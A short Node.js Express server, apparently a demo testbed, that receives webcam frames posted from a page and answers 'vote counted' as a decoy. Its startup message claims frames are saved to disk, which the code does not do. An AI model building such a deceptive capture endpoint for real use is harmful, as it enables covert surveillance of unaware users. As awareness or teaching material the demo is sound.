const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 3000;

// Настройка лимитов и парсинга JSON
app.use(express.json({ limit: '10mb' }));

// Отдаем главную страницу
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Эндпоинт для получения кадров с камеры
app.post('/upload', (req, res) => {
    const imageData = req.body.image;
    if (!imageData) return res.sendStatus(400);

    // Вместо сохранения на диск, просто логируем получение данных для демонстрации
    console.log(`[!] [${new Date().toLocaleTimeString()}] Получен новый кадр (размер: ${Math.round(imageData.length / 1024)} KB)`);
    
    // В реальном сценарии здесь была бы запись в файл или БД
    // Но так как файловая система доступна только для чтения, мы просто подтверждаем успех
    res.status(200).send({ status: 'ok', message: 'Голос учтен' });
});
app.listen(PORT, () => {
    console.log(`[SERVER] Стенд запущен на http://localhost:${PORT}`);
    console.log(`[SERVER] Фото сохраняются в папку: ${path.join(__dirname, 'captures')}`);
});
